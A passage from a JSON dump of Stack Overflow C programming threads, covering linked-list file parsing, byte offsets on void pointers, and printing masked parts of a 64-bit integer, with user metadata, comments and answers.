int int\n         ^\n</code></pre>\n\n<p>how read <code>format_io.c:3:6:</code>,<br>\nwhen check line 6, do no t find the void error.</p>\n"}, {"tags": ["c", "file"], "comments": [{"owner": {"reputation": 768, "user_id": 938740, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ZWhew.png?s=128&g=1", "display_name": "torstenvl", "link": "https://stackoverflow.com/users/938740/torstenvl"}, "edited": false, "score": 0, "creation_date": 1542162206, "post_id": 53292164, "comment_id": 93465999, "body": "First of all, <code>line</code> is never allocated any space that I can see, so you have undefined behavior. Literally anything can happen. Where is <code>getline()</code> defined?"}, {"owner": {"reputation": 1, "user_id": 3975177, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ODKj.jpg?s=128&g=1", "display_name": "Swordfish", "link": "https://stackoverflow.com/users/3975177/swordfish"}, "reply_to_user": {"reputation": 768, "user_id": 938740, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ZWhew.png?s=128&g=1", "display_name": "torstenvl", "link": "https://stackoverflow.com/users/938740/torstenvl"}, "edited": false, "score": 2, "creation_date": 1542162264, "post_id": 53292164, "comment_id": 93466017, "body": "@torstenvl <code>getline()</code> allocates mem."}, {"owner": {"reputation": 1, "user_id": 3975177, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ODKj.jpg?s=128&g=1", "display_name": "Swordfish", "link": "https://stackoverflow.com/users/3975177/swordfish"}, "edited": false, "score": 1, "creation_date": 1542162348, "post_id": 53292164, "comment_id": 93466034, "body": "@NeverSleepAlwaysCode Why is your code one sole spaghetti in main? Don&#39;t you know how to write functions yet?"}, {"owner": {"reputation": 41, "user_id": 10538841, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/61b2f62de66f475ea5387df03c5fd715?s=128&d=identicon&r=PG&f=1", "display_name": "NeverSleepAlwaysCode", "link": "https://stackoverflow.com/users/10538841/neversleepalwayscode"}, "reply_to_user": {"reputation": 1, "user_id": 3975177, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ODKj.jpg?s=128&g=1", "display_name": "Swordfish", "link": "https://stackoverflow.com/users/3975177/swordfish"}, "edited": false, "score": 0, "creation_date": 1542162438, "post_id": 53292164, "comment_id": 93466056, "body": "@Swordfish I am required by my professor to write the read in file in the main. I had divided my code before into functions and lost 20 points for not following guidelines which makes it confusing for me."}, {"owner": {"reputation": 41, "user_id": 10538841, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/61b2f62de66f475ea5387df03c5fd715?s=128&d=identicon&r=PG&f=1", "display_name": "NeverSleepAlwaysCode", "link": "https://stackoverflow.com/users/10538841/neversleepalwayscode"}, "edited": false, "score": 0, "creation_date": 1542162507, "post_id": 53292164, "comment_id": 93466081, "body": "Ideally, i would prefer to have a separate function to read file and another to allocate into array."}, {"owner": {"reputation": 41, "user_id": 10538841, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/61b2f62de66f475ea5387df03c5fd715?s=128&d=identicon&r=PG&f=1", "display_name": "NeverSleepAlwaysCode", "link": "https://stackoverflow.com/users/10538841/neversleepalwayscode"}, "edited": false, "score": 0, "creation_date": 1542162520, "post_id": 53292164, "comment_id": 93466085, "body": "Makes it easier to debug as well"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1542167141, "post_id": 53292164, "comment_id": 93467046, "body": "Note: <code>if (line)         free(line);</code> may be simplified to <code>free(line);</code>.  The <code>if (line)</code> is unnecessary."}], "answers": [{"tags": [], "owner": {"reputation": 1058, "user_id": 2438650, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/55c2b3926bd8282c899903b32a6f002b?s=128&d=identicon&r=PG", "display_name": "lod", "link": "https://stackoverflow.com/users/2438650/lod"}, "is_accepted": false, "score": 0, "last_activity_date": 1542169254, "last_edit_date": 1542169254, "creation_date": 1542167852, "answer_id": 53292996, "question_id": 53292164, "link": "https://stackoverflow.com/questions/53292164/not-reading-number-properly/53292996#53292996", "title": "Not reading number properly?", "body": "<p>When you hit a space character you iterate i. At the end of your loop you iterate i.</p>\n\n<p>So when you hit a space character you iterate i twice, skipping the number and landing on the next space character.</p>\n\n<p>Which is why you get the first number but miss the rest.</p>\n\n<p>edit: removed getline() comments due to feedback from @swordfish. Current implementation is not problematic.</p>\n"}, {"tags": [], "owner": {"reputation": 1, "user_id": 3975177, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ODKj.jpg?s=128&g=1", "display_name": "Swordfish", "link": "https://stackoverflow.com/users/3975177/swordfish"}, "is_accepted": true, "score": 0, "last_activity_date": 1542174715, "last_edit_date": 1542174715, "creation_date": 1542167900, "answer_id": 53293001, "question_id": 53292164, "link": "https://stackoverflow.com/questions/53292164/not-reading-number-properly/53293001#53293001", "title": "Not reading number properly?", "body": "<p>I am not sure why you want to have an array of pointers to <code>node</code> which you all allocate memory for at the beginning of your program without knowing how many <code>node</code>s will be needed. Then you allocate memory again while reading from the file.</p>\n\n<p>Given the constraints of not being allowed to use functions, thats how i'd read the file and build a list:</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n\ntypedef struct node_tag {\n    int value;\n    struct node_tag *next;\n} node_t;\n\nint main(void)\n{\n    char const *filename = \"test.txt\";\n    FILE *input_file = fopen(filename, \"r\");\n    if (!input_file) {\n        fprintf(stderr, \"Couldn't open \\\"%s\\\" for reading :(\\n\\n\", filename);\n        return EXIT_FAILURE;\n    }\n\n    // read from file and build a list:\n    node_t *head = NULL;\n    node_t *tail = NULL;\n    int value;\n    int result = EXIT_SUCCESS;\n\n    while (fscanf(input_file, \"%d\", &amp;value) == 1) {\n        node_t *new_node = calloc(1, sizeof *new_node);\n        if (!new_node) {\n            fputs(\"Not enough memory :(\\n\\n\", stderr);\n            result = EXIT_FAILURE;\n            goto glean_up;\n        }\n\n        new_node-&gt;value = value;\n\n        if (!head) {  // there is no head yet so new_node becomes the head\n            head = tail = new_node;  // which is also the lists tail\n            continue;\n        }\n\n        tail-&gt;next = new_node;\n        tail = new_node;\n    }\n\n    // print the list:\n    for (node_t *current_node = head; current_node; current_node = current_node-&gt;next)\n        printf(\"%d \", current_node-&gt;value);\n    putchar('\\n');\n\n\nclean_up:\n    fclose(input_file);\n\n    for (node_t *current_node = head, *temp; current_node; current_node = temp) {\n        temp = current_node-&gt;next;\n        free(current_node);\n    }\n\n    return result;\n}\n</code></pre>\n\n<p>Ideally you'd write functions to manage the list:</p>\n\n<pre><code>#include &lt;stdbool.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n\ntypedef struct node_tag {\n    int value;\n    struct node_tag *next;\n} node_t;\n\ntypedef struct list_tag {\n    node_t *head;\n    node_t *tail;\n} list_t;\n\nvoid list_create(list_t *list)\n{\n    list-&gt;head = list-&gt;tail = NULL;\n}\n\nbool list_push_back(list_t *list, int value)\n{\n    node_t *new_node = calloc(1, sizeof *new_node);\n    if (!new_node)\n        return false;\n\n    new_node-&gt;value = value;\n\n    if (!list-&gt;head) {\n        list-&gt;head = list-&gt;tail = new_node;\n        return true;\n    }\n\n    list-&gt;tail-&gt;next = new_node;\n    list-&gt;tail = new_node;\n    return true;\n}\n\nvoid list_print(list_t *list)\n{\n    for (node_t *current_node = list-&gt;head; current_node; current_node = current_node-&gt;next)\n        printf(\"%d \", current_node-&gt;value);\n}\n\nvoid list_free(list_t *list)\n{\n    for (node_t *current_node = list-&gt;head, *temp; current_node; current_node = temp) {\n        temp = current_node-&gt;next;\n        free(current_node);\n    }\n}\n\nbool read_int(FILE *input_file, int *value)\n{\n    return fscanf(input_file, \"%d\", value) == 1;\n}\n\nint main(void)\n{\n    char const *filename = \"test.txt\";\n    FILE *input_file = fopen(filename, \"r\");\n    if (!input_file) {\n        fprintf(stderr, \"Couldn't open \\\"%s\\\" for reading :(\\n\\n\", filename);\n        return EXIT_FAILURE;\n    }\n\n    // read from file and build a list:\n    list_t list;\n    list_create(&amp;list);\n    int value;\n\n    while (read_int(input_file, &amp;value)) {\n        if (!list_push_back(&amp;list, value)) {\n            fputs(\"Not enough memory :(\\n\\n\", stderr);\n            // clean up:\n            fclose(input_file);\n            list_free(&amp;list);\n            return EXIT_FAILURE;\n        }\n    }\n\n    // print the list:\n    list_print(&amp;list);\n    putchar('\\n');\n\n    // clean up:\n    fclose(input_file);\n    list_free(&amp;list);\n}\n</code></pre>\n\n<h3>Output:</h3>\n\n<pre><code>1 3 4 2 4 3 1 4 4 2 1 3\n</code></pre>\n"}], "owner": {"reputation": 41, "user_id": 10538841, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/61b2f62de66f475ea5387df03c5fd715?s=128&d=identicon&r=PG&f=1", "display_name": "NeverSleepAlwaysCode", "link": "https://stackoverflow.com/users/10538841/neversleepalwayscode"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 54, "favorite_count": 0, "accepted_answer_id": 53293001, "answer_count": 2, "score": 0, "last_activity_date": 1542174715, "creation_date": 1542161090, "last_edit_date": 1542164819, "question_id": 53292164, "link": "https://stackoverflow.com/questions/53292164/not-reading-number-properly", "title": "Not reading number properly?", "body": "<p>I'm trying to read from file line by line. It takes the first number of the line and the rest it connects it using a char of linked list. But when I run it, i get the connection as <code>-38</code> (which is wrong) and it only prints it once and does not go through the rest of the line. but it reads first element perfectly.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstruct node{\n    int data;\n    struct node* next;\n};\n\n\nint main(void)\n{\n    FILE * fp;\n    char * line = NULL;\n    char * storage;\n    size_t len = 0;\n    ssize_t read;\n    struct node *G[1000];\n    for (int i = 1; i &lt; 1000; i++)\n    {\n        G[i]= malloc(sizeof(struct node));\n        G[i]-&gt;data = i;\n        G[i]-&gt;next = NULL;\n    }\n\n    fp = fopen(\"idk2.txt\", \"r\");\n    if (fp == NULL)\n        exit(EXIT_FAILURE);\n\n    while ((read = getline(&amp;line, &amp;len, fp)) != -1) {\n        int vertexGettingConntected = line[0];\n        struct node* newItem;\n        printf(\"Retrieved line of length %zu :\", read);\n        int i = 0;\n        while(line[i] != '\\0'){\n          if ( line[i] == ' '){\n            i++;\n          }\n          else if (i == 0){\n            newItem = malloc(sizeof(struct node));\n            int itemStorage = line[0] - '0';\n            newItem-&gt;next = NULL;\n            newItem-&gt;data = itemStorage;\n            G[itemStorage] = newItem;\n            printf(\"This is first Number:%d\\n\", itemStorage);\n          }\n          else if (line[i] != ' '){\n            struct node* addingItem = newItem;\n            while(addingItem-&gt;next != NULL){\n              addingItem = addingItem-&gt;next;\n            }\n            int itemStorage = line[i] - '0';\n            struct node* newConnection = malloc(sizeof(struct node));\n            addingItem-&gt;next = newConnection;\n            newConnection-&gt;data = itemStorage;\n            newConnection-&gt;next = NULL;\n            printf(\"This is character:%c\\n\", line[i]);\n            printf(\"This is connection:%i\\n\", itemStorage);\n          }\n          i++;\n        }\n    }\n\n    fclose(fp);\n    if (line)\n        free(line);\n    exit(EXIT_SUCCESS);\n    for(int printer = 1; printer&lt;20; printer++){\n        printf(\"%d\\n\",G[printer]-&gt;data);\n    }\n  }\n</code></pre>\n\n<p>EDIT: \nJust wanted to include file im reading from:</p>\n\n<pre><code>1 3 4\n2 4\n3 1 4\n4 2 1 3\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 21326, "user_id": 1679849, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lpvxY.png?s=128&g=1", "display_name": "r3mainer", "link": "https://stackoverflow.com/users/1679849/r3mainer"}, "edited": false, "score": 1, "creation_date": 1542159956, "post_id": 53291982, "comment_id": 93465507, "body": "Try <code>node-&gt;pointer = (void*)((char*)(node-&gt;pointer) + size);</code>"}, {"owner": {"reputation": 39, "user_id": 7744673, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9879bbfd5e89df42ff5a01f8e734d9b2?s=128&d=identicon&r=PG&f=1", "display_name": "whoshotya", "link": "https://stackoverflow.com/users/7744673/whoshotya"}, "reply_to_user": {"reputation": 21326, "user_id": 1679849, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lpvxY.png?s=128&g=1", "display_name": "r3mainer", "link": "https://stackoverflow.com/users/1679849/r3mainer"}, "edited": false, "score": 0, "creation_date": 1542160181, "post_id": 53291982, "comment_id": 93465557, "body": "Thank you so much! I can&#39;t believe I overlooked casting it back to void!"}, {"owner": {"reputation": 8204, "user_id": 2858773, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/5iGps.jpg?s=128&g=1", "display_name": "Ajay Brahmakshatriya", "link": "https://stackoverflow.com/users/2858773/ajay-brahmakshatriya"}, "reply_to_user": {"reputation": 21326, "user_id": 1679849, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lpvxY.png?s=128&g=1", "display_name": "r3mainer", "link": "https://stackoverflow.com/users/1679849/r3mainer"}, "edited": false, "score": 0, "creation_date": 1542161484, "post_id": 53291982, "comment_id": 93465850, "body": "@squeamishossifrage you don&#39;t need to explicitly cast to <code>void*</code> because <code>char*</code> is automatically converted to <code>void*</code>. Right?"}, {"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "edited": false, "score": 0, "creation_date": 1542196448, "post_id": 53291982, "comment_id": 93479850, "body": "Your title asks how to add a number of bytes to a \u201cvoid pointer,\u201d but your question implies you are adding to a pointer to <code>int</code>, where it says \u201cWhat the above does is actually add size*4 bytes to pointer because int is 4 bytes.\u201d What is the actual type of <code>node-&gt;pointer</code>?"}, {"owner": {"reputation": 39, "user_id": 7744673, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9879bbfd5e89df42ff5a01f8e734d9b2?s=128&d=identicon&r=PG&f=1", "display_name": "whoshotya", "link": "https://stackoverflow.com/users/7744673/whoshotya"}, "reply_to_user": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "edited": false, "score": 0, "creation_date": 1542593966, "post_id": 53291982, "comment_id": 93611590, "body": "@EricPostpischil It&#39;s void* type"}], "answers": [{"comments": [{"owner": {"reputation": 26606, "user_id": 4603670, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f7eabc1427aa3c8185153cc81978289a?s=128&d=identicon&r=PG&f=1", "display_name": "Barmak Shemirani", "link": "https://stackoverflow.com/users/4603670/barmak-shemirani"}, "edited": false, "score": 0, "creation_date": 1542161718, "post_id": 53292040, "comment_id": 93465907, "body": "This is fine in Visual Studio as well. Do you mean it&#39;s incompatible in some odd platforms?"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "reply_to_user": {"reputation": 26606, "user_id": 4603670, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f7eabc1427aa3c8185153cc81978289a?s=128&d=identicon&r=PG&f=1", "display_name": "Barmak Shemirani", "link": "https://stackoverflow.com/users/4603670/barmak-shemirani"}, "edited": false, "score": 1, "creation_date": 1542161940, "post_id": 53292040, "comment_id": 93465944, "body": "I mean that the C standard says it is not allowed.  I&#39;ve not yet got my quotes lined up.  One is C11 <a href=\"http://port70.net/~nsz/c/c11/n1570.html#6.2.5p19\" rel=\"nofollow noreferrer\">&#167;6.2.5 Types &#182;19</a>; there will need to be others.  But you can&#39;t determine the size of an incomplete type, and <code>void</code> can&#39;t be completed, and to increment a pointer, you need to know the size in bytes, so\u2026but as I said, I&#39;ve not got all the relevant quotes in place just yet, and I need to take an hour or two out before I can expand my answer \u2014 there&#39;s some &quot;life&quot; that needs to be lived."}, {"owner": {"reputation": 26606, "user_id": 4603670, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f7eabc1427aa3c8185153cc81978289a?s=128&d=identicon&r=PG&f=1", "display_name": "Barmak Shemirani", "link": "https://stackoverflow.com/users/4603670/barmak-shemirani"}, "edited": false, "score": 0, "creation_date": 1542163715, "post_id": 53292040, "comment_id": 93466351, "body": "Sorry, I misunderstood your answer about what&#39;s standard and what&#39;s not standard, even though it&#39;s written clearly. <code>node-&gt;pointer = (char *)node-&gt;pointer + size;</code> works in Visual Studio, not the other."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "reply_to_user": {"reputation": 26606, "user_id": 4603670, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f7eabc1427aa3c8185153cc81978289a?s=128&d=identicon&r=PG&f=1", "display_name": "Barmak Shemirani", "link": "https://stackoverflow.com/users/4603670/barmak-shemirani"}, "edited": false, "score": 0, "creation_date": 1542174225, "post_id": 53292040, "comment_id": 93468742, "body": "I&#39;ve added the most relevant sections of the C standard."}, {"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "edited": false, "score": 0, "creation_date": 1542196304, "post_id": 53292040, "comment_id": 93479762, "body": "Since there is a C standard way to do this, would\u2019t it be better for an answer to lead with that? The GCC extension seems to add little or no value."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "reply_to_user": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "edited": false, "score": 0, "creation_date": 1542202768, "post_id": 53292040, "comment_id": 93483634, "body": "@EricPostpischil \u2014 I lead with an explanation of what is wrong with the code in the question. I then show how it can be fixed. And for a depressingly large number of people, \u201cit works in GCC\u201d is sufficient; they don\u2019t care about portability."}], "tags": [], "owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "is_accepted": false, "score": 2, "last_activity_date": 1542173934, "last_edit_date": 1542173934, "creation_date": 1542160106, "answer_id": 53292040, "question_id": 53291982, "link": "https://stackoverflow.com/questions/53291982/add-a-certain-number-of-bytes-to-a-void-pointer-in-c/53292040#53292040", "title": "Add a certain number of bytes to a void pointer in C", "body": "<p>If you don't mind using GCC extensions (<a href=\"https://gcc.gnu.org/onlinedocs/gcc-8.2.0/gcc/Pointer-Arith.html#Pointer-Arith\" rel=\"nofollow noreferrer\">Pointer arithmetic on <code>void</code> pointers and function pointers</a>) and you're actually using GCC (or Clang), then you can write (more or less) what you wrote using <code>+=</code>:</p>\n\n<pre><code>void foo(int size)\n{\n    node-&gt;pointer += size; // Not standard \u2014 using GCC extension\n}\n</code></pre>\n\n<p>It is not standard C, though, and therefore not portable.  From C11 (ISO/IEC 9899:2011):</p>\n\n<blockquote>\n  <ul>\n  <li><a href=\"http://port70.net/~nsz/c/c11/n1570.html#6.2.5p19\" rel=\"nofollow noreferrer\">\u00a76.2.5 Types \u00b619</a>: <em>The <code>void</code> type comprises an empty set of values; it is an incomplete object type that cannot be completed.</em></li>\n  <li><a href=\"https://port70.net/~nsz/c/c11/n1570.html#6.5.3.4\" rel=\"nofollow noreferrer\">\u00a76.5.3.4 The <code>sizeof</code> and <code>_Alignof</code> operators</a>: <em>The sizeof operator shall not be applied to an expression that has function type or an incomplete type, to the parenthesized name of such a type, or \u2026</em></li>\n  <li><a href=\"https://port70.net/~nsz/c/c11/n1570.html#6.5.6p2\" rel=\"nofollow noreferrer\">\u00a76.5.6 Additive operators</a>: <em>For addition, either both operands shall have arithmetic type, or one operand shall be a pointer to a complete object type and the other shall have integer type.</em></li>\n  <li><a href=\"https://port70.net/~nsz/c/c11/n1570.html#6.5.6p3\" rel=\"nofollow noreferrer\">\u00a76.5.6 Additive operators</a>: <em>For subtraction, one of the following shall hold:</em>\n  \n  <ul>\n  <li><em>both operands have arithmetic type;</em></li>\n  <li><em>both operands are pointers to qualified or unqualified versions of compatible complete object types; or</em></li>\n  <li><em>the left operand is a pointer to a complete object type and the right operand has integer type.</em></li>\n  </ul></li>\n  <li><a href=\"https://port70.net/~nsz/c/c11/n1570.html#6.5.16.2p1\" rel=\"nofollow noreferrer\">\u00a76.5.16.2 Compound assignment \u00b61</a>: <em>For the operators <code>+=</code> and <code>-=</code> only, either the left operand shall be an atomic, qualified, or unqualified pointer to a complete object type, and the right shall have integer type; or the left operand shall have atomic, qualified, or unqualified arithmetic type, and the right shall have arithmetic type.</em></li>\n  </ul>\n</blockquote>\n\n<p>Since the <code>void</code> type is incomplete and cannot be completed, and therefore a <code>void *</code> is a pointer to an incomplete type, you can't use <code>void</code> with <code>sizeof</code>, nor can you use <code>void *</code> with <code>+</code> or <code>-</code> to do pointer arithmetic, and consequently you can't use <code>void *</code> with the compound assignments <code>+=</code> and <code>-=</code> either. </p>\n\n<p>The standard C equivalent would be:</p>\n\n<pre><code>void foo(int size)\n{\n    node-&gt;pointer = (char *)node-&gt;pointer + size;\n}\n</code></pre>\n\n<p>This code doesn't return a value, any more than yours did (though you said it would because the return type was <code>void *</code>).  Since <code>node-&gt;pointer</code> is a <code>void *</code>, you don't need a cast back to <code>void *</code>; this is C and the conversion is automatic.</p>\n"}, {"tags": [], "owner": {"reputation": 1, "user_id": 8184360, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ca5a9653b03203d89b7d00123bc9456a?s=128&d=identicon&r=PG&f=1", "display_name": "Abhinav Jain", "link": "https://stackoverflow.com/users/8184360/abhinav-jain"}, "is_accepted": false, "score": 0, "last_activity_date": 1542171269, "creation_date": 1542171269, "answer_id": 53293393, "question_id": 53291982, "link": "https://stackoverflow.com/questions/53291982/add-a-certain-number-of-bytes-to-a-void-pointer-in-c/53293393#53293393", "title": "Add a certain number of bytes to a void pointer in C", "body": "<p>writing a sample code for your reference. I used similar concept as answered above.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nstruct node{\n int payload;\n void *ptr;\n}*n;\n\nvoid foo(int x){\n n-&gt;ptr = (char *)n-&gt;ptr +x;\n}\n\nint main(){\n  n = malloc(sizeof(struct node));\n  n-&gt;payload = 10; //random payload\n  n-&gt;ptr = n;\n\n  printf(\"%p\\n\", n-&gt;ptr);\n  foo(2); //increment by 2\n  printf(\"%p\\n\", n-&gt;ptr);\n}\n</code></pre>\n"}], "owner": {"reputation": 39, "user_id": 7744673, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9879bbfd5e89df42ff5a01f8e734d9b2?s=128&d=identicon&r=PG&f=1", "display_name": "whoshotya", "link": "https://stackoverflow.com/users/7744673/whoshotya"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 273, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1542173934, "creation_date": 1542159737, "last_edit_date": 1542161559, "question_id": 53291982, "link": "https://stackoverflow.com/questions/53291982/add-a-certain-number-of-bytes-to-a-void-pointer-in-c", "title": "Add a certain number of bytes to a void pointer in C", "body": "<p>I have been banging my ahead on this problem for many hours now. Suppose you have a function that takes an int value as parameter. What I need to do is take this int value and interpret whatever the value is as # of bytes to be added to an address:</p>\n\n<pre><code>void* foo(int size){\n  node-&gt;pointer += size; //assume node-&gt;pointer is of type void*\n}\n</code></pre>\n\n<p>What the above does is actually add size*4 bytes to pointer because int is 4 bytes. casting this as (char*) i.e.</p>\n\n<pre><code>node-&gt;pointer += (char*)size; \n</code></pre>\n\n<p>this does't work.\nHow do I do this in the most simple way?</p>\n"}, {"tags": ["c", "bit-manipulation"], "comments": [{"owner": {"reputation": 1058, "user_id": 2438650, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/55c2b3926bd8282c899903b32a6f002b?s=128&d=identicon&r=PG", "display_name": "lod", "link": "https://stackoverflow.com/users/2438650/lod"}, "edited": false, "score": 0, "creation_date": 1542160253, "post_id": 53291950, "comment_id": 93465574, "body": "Compiling your code with gcc 6.3.0 I get <code>0xABCDABCD.1.1b0</code>. It works but the leading zeros on the second two values are dropped, use <code>%04x</code> if you need them."}, {"owner": {"reputation": 42446, "user_id": 902497, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ff13ece6277497484bfa2911c6183a30?s=128&d=identicon&r=PG", "display_name": "Raymond Chen", "link": "https://stackoverflow.com/users/902497/raymond-chen"}, "edited": false, "score": 1, "creation_date": 1542160814, "post_id": 53291950, "comment_id": 93465698, "body": "Turn on compiler warnings. <code>warning: format &#39;%X&#39; expects argument of type &#39;unsigned int&#39;, but argument 2 has type &#39;uint64_t&#39; {aka &#39;long unsigned int&#39;} [-Wformat=]</code>"}], "answers": [{"comments": [{"owner": {"reputation": 12557, "user_id": 1270789, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/FXwoB.png?s=128&g=1", "display_name": "Ken Y-N", "link": "https://stackoverflow.com/users/1270789/ken-y-n"}, "edited": false, "score": 0, "creation_date": 1542160905, "post_id": 53292097, "comment_id": 93465714, "body": "Note, <code>p2</code> should be printed in decimal according to the original code."}], "tags": [], "owner": {"reputation": 7691, "user_id": 152016, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/61e75a9dfee755b5a3d1104d4d3c104a?s=128&d=identicon&r=PG", "display_name": "Niloct", "link": "https://stackoverflow.com/users/152016/niloct"}, "is_accepted": false, "score": 0, "last_activity_date": 1542160526, "creation_date": 1542160526, "answer_id": 53292097, "question_id": 53291950, "link": "https://stackoverflow.com/questions/53291950/get-last-two-bytes-from-a-64bit-value/53292097#53292097", "title": "Get last two bytes from a 64bit value", "body": "<p>Perhaps this polished version can be of use to you:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdint.h&gt;\nuint64_t val = 0xabcdabcd010001b0;\n\nint main() {\n   void *p1, *p2, *p3;\n   p1 = (void *) (val &amp; 0xFFFFFFFF00000000 &gt;&gt; 32);\n   p2 = (void *) (val &amp; 0x00000000FF000000 &gt;&gt; 24);\n   p3 = (void *) (val &amp; 0x000000000000FFFF);\n   printf(\"%p.%p.%p\\n\",p1, p2, p3);\n   return 0;\n}\n</code></pre>\n\n<p>Trick that a pointer type can handle those ints as addresses in a x64 machine.</p>\n"}, {"tags": [], "owner": {"reputation": 12557, "user_id": 1270789, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/FXwoB.png?s=128&g=1", "display_name": "Ken Y-N", "link": "https://stackoverflow.com/users/1270789/ken-y-n"}, "is_accepted": true, "score": 1, "last_activity_date": 1542161286, "last_edit_date": 1542161286, "creation_date": 1542160846, "answer_id": 53292134, "question_id": 53291950, "link": "https://stackoverflow.com/questions/53291950/get-last-two-bytes-from-a-64bit-value/53292134#53292134", "title": "Get last two bytes from a 64bit value", "body": "<p>The problem is that the results of the bitmasks are <code>uint64_t</code> types. To print correctly, you need this code, <a href=\"http://tpcg.io/POcCUU\" rel=\"nofollow noreferrer\">online here</a>:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;inttypes.h&gt;\n\nuint64_t val  = 0xabcdabcd010001b0;\n\nint main() {\n   printf(\"0x%\" PRIX64 \".%\" PRId64 \".%\" PRIx64,\n    (val&amp;0xFFFFFFFF00000000)&gt;&gt;32, \n    (val&amp;0x00000000FF000000)&gt;&gt;24,\n    (val&amp;0x000000000000FFFF));\n   return 0;\n}\n</code></pre>\n\n<p>See the section \"Format constants for the std::fprintf family of functions\" on <a href=\"https://en.cppreference.com/w/cpp/types/integer\" rel=\"nofollow noreferrer\">this page for more formats</a>.</p>\n"}, {"tags": [], "owner": {"reputation": 1741, "user_id": 2042587, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/xX3xO.jpg?s=128&g=1", "display_name": "Heavy", "link": "https://stackoverflow.com/users/2042587/heavy"}, "is_accepted": false, "score": 0, "last_activity_date": 1542160917, "creation_date": 1542160917, "answer_id": 53292141, "question_id": 53291950, "link": "https://stackoverflow.com/questions/53291950/get-last-two-bytes-from-a-64bit-value/53292141#53292141", "title": "Get last two bytes from a 64bit value", "body": "<p><code>%X</code> and <code>%d</code> require <code>int</code> arguments, but you are passing <code>uint64_t</code>. Try using <code>PRIu64</code> and <code>PRIx64</code> macros instead. See <a href=\"http://cpp.sh/9zx72\" rel=\"nofollow noreferrer\">cpp.sh fiddle</a>:</p>\n\n<pre><code>#include &lt;stdint.h&gt;\n#include &lt;inttypes.h&gt;\n\n// ...\n\n   